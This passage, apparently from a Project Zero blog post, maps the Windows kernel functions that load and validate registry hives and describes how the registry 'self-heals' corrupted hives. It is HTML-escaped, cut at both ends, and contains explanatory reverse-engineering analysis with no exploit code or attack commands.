              &lt;/li&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c50 c12 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckRegistry2&lt;/span&gt;
                &lt;ul class=&quot;lst-kix_2w36zq8cd80k-4 start&quot;&gt;
                  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c12 c29 li-bullet-0&quot;&gt;
                    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckKey&lt;/span&gt;
                    &lt;ul class=&quot;lst-kix_2w36zq8cd80k-5 start&quot;&gt;
                      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c12 c60 li-bullet-0&quot;&gt;
                        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckValueList&lt;/span&gt;
                      &lt;/li&gt;
                      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c12 c60 li-bullet-0&quot;&gt;
                        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckLeaf&lt;/span&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c29 c12 li-bullet-0&quot;&gt;
                    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckLexicographicalOrder&lt;/span&gt;
                  &lt;/li&gt;
                  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c29 c12 li-bullet-0&quot;&gt;
                    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckAndFixSecurityCellsRefcount&lt;/span&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpLoadKeyCommon&lt;/span&gt;
        &lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_2w36zq8cd80k-2 start&quot;&gt;
          &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c38 c12 li-bullet-0&quot;&gt;
            &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpLinkHiveToMaster&lt;/span&gt;
            &lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_2w36zq8cd80k-3 start&quot;&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c50 c12 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;ObOpenObjectByName &amp;rarr; ... &amp;lt;NT Object Manager&amp;gt; ... &amp;rarr; CmpParseKey &amp;rarr; CmpDoParseKey&lt;/span&gt;
                &lt;ul class=&quot;lst-kix_2w36zq8cd80k-4 start&quot;&gt;
                  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c29 c12 li-bullet-0&quot;&gt;
                    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpUpdateHiveRootCellFlags&lt;/span&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Here is a short summary of each of the above functions, according to my own analysis and understanding:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c27&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Function name(s)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;NtLoadKey*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;The four syscall entry points for loading registry hives, as discussed in the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html&quot;&gt;previous post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;: NtLoadKey, NtLoadKey2, NtLoadKeyEx, NtLoadKey3.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmLoadDifferencingKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A generic function for loading hives &amp;ndash; not just differencing ones but every kind, contrary to what the name might suggest. Other than the syscall handlers, it is also called by VrpPreLoadKey and VrpLoadDifferencingHive, which are parts of the VRegDriver. It is responsible for sanitizing the input flags, checking the privileges of the caller, calling registry callbacks, invoking specialized functions to actually load the hive, and opening a handle to the root of the hive if the caller requested it.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmLoadKey,&lt;br&gt;CmLoadAppKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Functions implementing the core functionality of loading normal and app hives, respectively. They are responsible for coordinating lower-layer loading functions, resolving any conflicts related to the hive file / registry mount path, and inserting the hive-related objects into the corresponding kernel data structures. In terms of opening and validating the binary hive representation, they are virtually equivalent.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCmdHiveOpen,&lt;br&gt;CmpInitHiveFromFile,&lt;br&gt;CmpCreateHive&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Functions dedicated to opening the hive file on disk, loading it in memory, validating its integrity and allocating the internal kernel structures (_CMHIVE and other objects representing the hive).&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvHiveStartFileBacked,&lt;br&gt;HvLoadHive&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Common functions for loading and sanitizing the hive on the level of header, bins and cells (the lowest level of the pyramid). &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvpGetHiveHeader&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Reads and validates the hive header, trying to determine if it is valid or corrupted, and whether the header or hive data need to be recovered from a log file.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvAnalyzeLogFiles,&lt;br&gt;HvpPerformLogFileRecovery&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Two most important functions related to data recovery from log files: the first one determines which of the two files (.LOG1/LOG2) to use, and the second one actually applies the log file entries to the hive mapping in memory.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvpRemapAndEnlistHiveBins,&lt;br&gt;HvpValidateLoadedBin,&lt;br&gt;HvpEnlistFreeCells&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Functions responsible for re-mapping the hive after log file recovery, in order to ensure that every bin is mapped as a continuous block of memory. During the process, the validity of all bins and the layout of their cells is verified.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmCheckRegistry&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A generic function encompassing the verification of levels &amp;ge; 2 of the pyramid, i.e. everything about the hive that defines its logical structure and is not related to memory management. If any self-healing occurs during the process, the function restarts its logic, so it may potentially take multiple iterations before a corrupted hive is fixed up and accepted as valid.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvCheckHive,&lt;br&gt;HvCheckBin&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Two functions responsible for validating the bin headers and layout of their cells. As you may have noticed, this part of their functionality is redundant with HvpValidateLoadedBin and HvpEnlistFreeCells. The difference is that the earlier functions are used to cache information about the positions of free cells in the hive, to optimize the allocation process later on. On the other hand, the underlying purpose of HvCheckHive and HvCheckBin is to generate a bitmap object (RTL_BITMAP) that indicates the positions of allocated cells, in order to ensure the validity of cell indexes when sanitizing the hive, and to make sure that every cell is only used for a single purpose in the hive.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;As a side note, there is an &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/18_HvCheckBin_incorrect_return_value&quot;&gt;amusing bug&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;in HvCheckBin related to verifying cell size correctness, but it seems to be non-exploitable precisely because the same sanitization is correctly performed earlier in HvpEnlistFreeCells.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpValidateHiveSecurityDescriptors&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The function traverses the linked list of security descriptor cells, and verifies its consistency (the correctness of the Flink/Blink indexes) and the validity of the security descriptor blobs. At the same time, it also caches information about the descriptors in internal kernel structures, so that they can be quickly looked up when verifying the _CM_KEY_NODE.Security fields, and later at system run time.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckRegistry2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A function responsible for performing a single attempt at validating the entire key structure. There are several possible return codes:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_2gqv10mkziv8-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;STATUS_SUCCESS if the hive validation passes without problems,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;STATUS_REGISTRY_HIVE_RECOVERED if minor corruption was encountered, but it was successfully fixed in-place,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;STATUS_RETRY if a badly corrupted key was encountered and removed from its parent&amp;#39;s subkey index. This causes CmCheckRegistry to restart the validation process from scratch.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;STATUS_REGISTRY_CORRUPT if the hive was found to be corrupted beyond repair.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Other problem-specific error codes such as STATUS_NO_LOG_SPACE or STATUS_INSUFFICIENT_RESOURCES, which cause the loading process to be aborted.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This is the central function in the hive sanitization process, with more than a thousand lines of code in decompiled output, and likely just as many in the original source code. It essentially checks the validity of all fields within a specific key node, and also orchestrates the validation of the value list and subkey index associated with the key. If there was one function I would recommend analyzing to better understand the regf format, it would be this one.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckValueList&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Checks the consistency of a value list, each of the value cells on the list, and their backing buffers / big data objects.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckLeaf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Validates a specific leaf subkey index, i.e. one of &amp;#39;li&amp;#39;, &amp;#39;lf&amp;#39;, &amp;#39;lh&amp;#39;. This includes checking the cell size, signature, validity of the subkey cell indexes and their hint values.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckLexicographicalOrder&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Compares&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;the name of two consecutive subkeys to determine if the second one is lexicographically greater than the first, in order to ensure the right sorting of a subkey index.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCheckAndFixSecurityCellsRefcount&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Iterates over all security descriptors in the hive, compares their refcounts loaded from disk with the values independently re-calculated while sanitizing the key tree, and corrects them if they are unequal. Since November 2024, it also frees any unused security descriptors with the reference count set to zero (they had been previously allowed, as described in &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/10_CmpKeySecurityIncrementReferenceCount_zero_refcount_crash&quot;&gt;WinRegLowSeverityBugs issue #10&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpUpdateHiveRootCellFlags&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The function makes sure that the root key of the hive has the KEY_NO_DELETE and KEY_HIVE_ENTRY flags set. Interestingly, these flags are the only aspect of the regf format that is not enforced directly while loading the hive (in CmpCheckKey), but only at a later stage when the hive is being mounted in the global registry view.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h3 class=&quot;MvcjwGOuIU-c57 MvcjwGOuIU-c12&quot; id=&quot;h.wnqw3dpo3d9p&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c54 MvcjwGOuIU-c17&quot;&gt;Self-healing properties&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The Windows implementation of the registry has the unique property that it is self-healing: the system tries very hard to successfully load a hive even if it&amp;#39;s partially corrupted. My guess is that the reason for this design was to make the mechanism resilient against random data corruption on disk, as failure to load a system hive early during start-up would make Windows unusable. Perhaps it was decided that it was a better tradeoff to forcefully remove the broken parts of the file, with the hope that they would be automatically re-created later at run time, or that they weren&amp;#39;t very important to begin with and the system/applications could continue to function correctly without them. And even if not, giving the user a chance to troubleshoot the problem or recover their data would still be a better outcome than bricking the machine completely.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Consequently, whenever an error is detected by the hive loading logic, it is handled in one of several ways, depending on the nature of the problem:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_4ee45band27p-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Bin recreation:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if HvpValidateLoadedBin indicates that any part of a bin header is corrupted, then HvpRemapAndEnlistHiveBins re-initializes it from scratch, and declares it as 4096 bytes long (regardless of the previous length).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Cell recreation:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if HvpEnlistFreeCells detects a cell with an invalid length, it converts it to a single free cell spanning from the current offset until the end of the bin, potentially erasing any other data/cells previously residing in that region.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Small, direct fix:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if a single field within a key node is found to have an invalid state, and the good/expected state is known to the kernel, the problem gets fixed by directly overwriting the old value with the correct one. Examples include cell signatures and mandatory/illegal flags.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Single value deletion:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if any inconsistencies are found in a value cell or its associated data cell(s), the specific value is removed from the key&amp;#39;s value list.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Deletion of entire value list:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if the descriptor of a value list (i.e. its cell index or length) are invalid, or if a symbolic link contains more than one value, the entire value list of the key is cleared.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Single key deletion:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if an irrecoverable problem is found within a key node (e.g. invalid cell index, invalid cell length, invalid name), then it is removed from its parent&amp;#39;s subkey index, and the key tree validation process is restarted from scratch.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Deletion of entire subkey index:&lt;/span&gt;&lt;span 